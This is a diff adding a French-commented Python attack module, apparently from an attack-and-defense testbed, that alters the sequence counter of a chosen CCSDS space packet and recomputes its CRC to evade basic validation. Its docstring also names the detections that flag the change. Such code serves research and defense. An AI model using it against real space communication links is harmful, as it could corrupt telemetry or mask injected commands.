@@ -1,1 +1,69 @@
-IyA9PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09CiMgYWx0ZXJfc2VxX2NvdW50LnB5IOKAkyBBdHRhcXVlIDIgLyBWZWN0ZXVyIDIgOiBNYW5pcHVsYXRpb24gZHUgc2VxQ291bnQKIwojIE1vZGlmaWUgbGUgY29tcHRldXIgZGUgc8OpcXVlbmNlIGQndW4gcGFxdWV0IENDU0RTIHBvdXIKIyBwZXJ0dXJiZXIgbGEgcmVjb25zdHJ1Y3Rpb24gb3Jkb25uw6llIGPDtHTDqSByw6ljZXB0ZXVyLgojIExlIENSQyBlc3QgcmVjYWxjdWzDqSBwb3VyIGNvbnRvdXJuZXIgbGEgdmFsaWRhdGlvbiBiYXNpcXVlLgojID09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT0KCmltcG9ydCBzeXMKaW1wb3J0IG9zCgpzeXMucGF0aC5pbnNlcnQoMCwgb3MucGF0aC5qb2luKG9zLnBhdGguZGlybmFtZShfX2ZpbGVfXyksICIuLiIsICIuLiIpKQpmcm9tIHNyYy5yZWNlaXZlci5mcmFtZVBhcnNlciBpbXBvcnQgcGFyc2VTdHJlYW0KZnJvbSBzcmMuYXR0YWNrcy5fdXRpbHMgaW1wb3J0IHJlYnVpbGRQYWNrZXQsIG9mZnNldEluU3RyZWFtCgoKZGVmIGFsdGVyU2VxQ291bnQoCiAgICByYXdTdHJlYW06IGJ5dGVzLAogICAgdGFyZ2V0U2VxOiBpbnQsCiAgICBuZXdTZXE6IGludCwKICAgIHZlcmJvc2U6IGJvb2wgPSBUcnVlLAopIC0+IGJ5dGVzOgogICAgIiIiCiAgICBSZW1wbGFjZSBsZSBzZXFDb3VudCBkJ3VuIHBhcXVldCBwYXIgdW5lIG5vdXZlbGxlIHZhbGV1ciwgQ1JDIHJlY29tcHV0ZWQuCgogICAgTGUgc2VxQ291bnQgZXN0IHV0aWxpc8OpIHBhciBsZSByw6ljZXB0ZXVyIHBvdXIgZMOpdGVjdGVyIGxlcyBwZXJ0ZXMKICAgIGV0IHLDqW9yZG9ubmVyIGxlcyBwYXF1ZXRzLiBMZSBtb2RpZmllciBwZXV0IGNhdXNlciBkZXMgU0VRX0dBUCBvdQogICAgU0VRX1JFT1JERVIsIG91IG1hc3F1ZXIgbCdpbmplY3Rpb24gZCd1biBwYXF1ZXQgZnJhdWR1bGV1eC4KCiAgICBBcmdzOgogICAgICAgIHJhd1N0cmVhbTogIEZsdXggZGUgcGFxdWV0cyBDQ1NEUyBicnV0cy4KICAgICAgICB0YXJnZXRTZXE6ICBzZXFDb3VudCBkdSBwYXF1ZXQgw6AgY2libGVyLgogICAgICAgIG5ld1NlcTogICAgIE5vdXZlYXUgbnVtw6lybyBkZSBzw6lxdWVuY2UgKDDigJMxNjM4MykuCiAgICAgICAgdmVyYm9zZTogICAgQWZmaWNoZXIgdW4gbG9nIGRlIGwnYWx0w6lyYXRpb24uCgogICAgUmV0dXJuczoKICAgICAgICBGbHV4IG1vZGlmacOpIGF2ZWMgc2VxQ291bnQgcmVtcGxhY8OpIGV0IENSQyByZWNvbXB1dGVkLgoKICAgIETDqXRlY3Rpb24gKETDqWZlbnNlIDIpIDoKICAgICAgICDihpIgSE1BQ19VTktOT1dOIDogbmV3U2VxIGFic2VudCBkdSB0YWcgbWFwIOKGkiBhbGVydGUKICAgICAgICDihpIgU0VRX0dBUCAgICAgIDogbCdJRFMgZMOpdGVjdGUgbGUgc2F1dCBkZSBzw6lxdWVuY2UKICAgICIiIgogICAgcGFja2V0cyA9IHBhcnNlU3RyZWFtKHJhd1N0cmVhbSkKICAgIHJlc3VsdCAgPSBieXRlYXJyYXkocmF3U3RyZWFtKQoKICAgIGZvciBwa3QgaW4gcGFja2V0czoKICAgICAgICBpZiBwa3RbInNlcUNvdW50Il0gIT0gdGFyZ2V0U2VxOgogICAgICAgICAgICBjb250aW51ZQoKICAgICAgICBvZmZzZXQgPSBvZmZzZXRJblN0cmVhbShwYWNrZXRzLCB0YXJnZXRTZXEpCiAgICAgICAgbmV3UGt0ID0gcmVidWlsZFBhY2tldCgKICAgICAgICAgICAgYXBpZCAgICAgICA9IHBrdFsiYXBpZCJdLAogICAgICAgICAgICBzZXFGbGFncyAgID0gcGt0WyJzZXFGbGFncyJdLAogICAgICAgICAgICBzZXFDb3VudCAgID0gbmV3U2VxLAogICAgICAgICAgICB2ZXJzaW9uICAgID0gcGt0WyJ2ZXJzaW9uIl0sCiAgICAgICAgICAgIHBhY2tldFR5cGUgPSBwa3RbInBhY2tldFR5cGUiXSwKICAgICAgICAgICAgc2VjSGRyRmxhZyA9IHBrdFsic2VjSGRyRmxhZyJdLAogICAgICAgICAgICBwYXlsb2FkICAgID0gcGt0WyJwYXlsb2FkIl0sCiAgICAgICAgKQogICAgICAgIHJlc3VsdFtvZmZzZXQgOiBvZmZzZXQgKyBwa3RbInRvdGFsU2l6ZSJdXSA9IG5ld1BrdAoKICAgICAgICBpZiB2ZXJib3NlOgogICAgICAgICAgICBwcmludCgKICAgICAgICAgICAgICAgIGYiW0EyL2FsdGVyU2VxQ291bnRdIHNlcUNvdW50IHt0YXJnZXRTZXF9IOKGkiB7bmV3U2VxfSAgIgogICAgICAgICAgICAgICAgZiIoQ1JDIHJlY29tcHV0ZWQpIgogICAgICAgICAgICApCiAgICAgICAgYnJlYWsKCiAgICByZXR1cm4gYnl0ZXMocmVzdWx0KQo=
+# =============================================================
+# alter_seq_count.py – Attaque 2 / Vecteur 2 : Manipulation du seqCount
+#
+# Modifie le compteur de séquence d'un paquet CCSDS pour
+# perturber la reconstruction ordonnée côté récepteur.
+# Le CRC est recalculé pour contourner la validation basique.
+# =============================================================
+
+import sys
+import os
+
+sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", ".."))
+from src.receiver.frame_parser import parse_stream
+from src.attacks._utils import rebuildPacket, offsetInStream
+
+
+def alterSeqCount(
+    rawStream: bytes,
+    targetSeq: int,
+    newSeq: int,
+    verbose: bool = True,
+) -> bytes:
+    """
+    Remplace le seqCount d'un paquet par une nouvelle valeur, CRC recomputed.
+
+    Le seqCount est utilisé par le récepteur pour détecter les pertes
+    et réordonner les paquets. Le modifier peut causer des SEQ_GAP ou
+    SEQ_REORDER, ou masquer l'injection d'un paquet frauduleux.
+
+    Args:
+        rawStream:  Flux de paquets CCSDS bruts.
+        targetSeq:  seqCount du paquet à cibler.
+        newSeq:     Nouveau numéro de séquence (0–16383).
+        verbose:    Afficher un log de l'altération.
+
+    Returns:
+        Flux modifié avec seqCount remplacé et CRC recomputed.
+
+    Détection (Défense 2) :
+        → HMAC_UNKNOWN : newSeq absent du tag map → alerte
+        → SEQ_GAP      : l'IDS détecte le saut de séquence
+    """
+    packets = parse_stream(rawStream)
+    result  = bytearray(rawStream)
+
+    for pkt in packets:
+        if pkt["seqCount"] != targetSeq:
+            continue
+
+        offset = offsetInStream(packets, targetSeq)
+        newPkt = rebuildPacket(
+            apid       = pkt["apid"],
+            seqFlags   = pkt["seqFlags"],
+            seqCount   = newSeq,
+            version    = pkt["version"],
+            packetType = pkt["packetType"],
+            secHdrFlag = pkt["secHdrFlag"],
+            payload    = pkt["payload"],
+        )
+        result[offset : offset + pkt["totalSize"]] = newPkt
+
+        if verbose:
+            print(
+                f"[A2/alterSeqCount] seqCount {targetSeq} → {newSeq}  "
+                f"(CRC recomputed)"
+            )
+        break
+
+    return bytes(result)
